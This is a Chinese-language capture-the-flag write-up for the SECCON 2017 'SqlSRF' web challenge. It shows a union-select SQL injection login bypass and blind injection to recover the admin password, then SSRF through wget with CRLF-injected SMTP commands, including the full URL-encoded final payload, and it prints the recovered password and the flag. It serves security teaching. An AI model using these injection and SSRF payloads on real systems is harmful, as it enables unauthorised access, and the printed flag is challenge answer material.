# SECCON CTF QUALS 2017 : SqlSRF

**category** : web
**points** : 400

> The root reply the flag to your mail address if you send a mail that subject is "give me flag" to root.
>
> http://sqlsrf.pwn.seccon.jp/sqlsrf/

## write-up

我們可以看到 index.cgi 的原始碼

這行有 sql injection `"SELECT password FROM users WHERE username='".$q->param('user')."';"`

看原始碼也可以知道他是用 sqlite

他會把 select 出來的東西跟 encrypt(param['pass']) 比較，一樣就可以登入了

另外，如果句選 Remember Me 的話，他會幫你把 encrypt(param['user']) 存在 cookie 裡面，然後幫你解密放在 user 的 input box ( 我們可以加解密任意字>串 )

所以先得到 encrypt('oalieno') = '6102b0591250cea64f303ec4a9c6425f'

user 放 `' union select '6102b0591250cea64f303ec4a9c6425f' -- `

pass 放 `oalieno`

就可以順利登入了

![](https://i.imgur.com/EQqOS9M.png)

在 menu.cgi 我們可以按 `netstat -tnl` 但是不能用 `wget --debug -O /dev/stdout 'http://{}'` ( 需要 admin )

![](https://i.imgur.com/9q6DY8Q.png)

所以我們回過頭來用 sql blind injection 取得 admin 的密碼 ([solve.py](SqlSRF/solve.py))

密碼是 encrypt 過的 ( 長度 32 ) 同樣用 Remember Me 解密

admin password = decrypt(d2f37e101c0e76bcc90b5634a5510f64) = 'Yes!Kusomon!!'

成功用 admin 登入後就可以用 wget 發 request

剛剛用 netstat 可以看到 `127.0.0.1:25` 這台 local 的 SMTP server

直接 wget `127.0.0.1:25` 的話可以看到 SMTP server 會把我們的 http request 的每一行都當成 SMTP 的指令來看

![](https://i.imgur.com/a0Mdg7W.png)

那我們就用 `%0d%0a` 來下 SMTP 指令寄信給 `root`

```
127.0.0.1
HELO oalieno
MAIL From: <xxx@gmail.com>
RCPT To: <root>
DATA
Subject: give me flag
oalieno
.
:25/
```

把上面的東東做 urlencode 就可以了

final payload : `127.0.0.1%0D%0AHELO%20oalieno%0D%0AMAIL%20From%3A%20%3Cxxx%40gmail.com%3E%0D%0ARCPT%20To%3A%20%3Croot%3E%0D%0ADATA%0D%0ASubject%3A%20give%20me%20flag%0D%0Aoalieno%0D%0A.%0D%0A:25/`

然後就收到信了XD

![](https://i.imgur.com/OEwnXKM.png)

但是 flag 也被 encrypt 過，那就同樣用 Remember Me 解密

flag : SECCON{SSRFisMyFriend!}

## other write-ups and resources

* https://bongtrop.github.io/SECCON2017-Writeup/#sqlsrf-400-points
* https://ctftime.org/writeup/8339
* https://ctftime.org/writeup/8331
* https://github.com/p4-team/ctf/tree/master/2017-12-09-seccon-quals/web_sqlsrf
* https://ctftime.org/writeup/8308
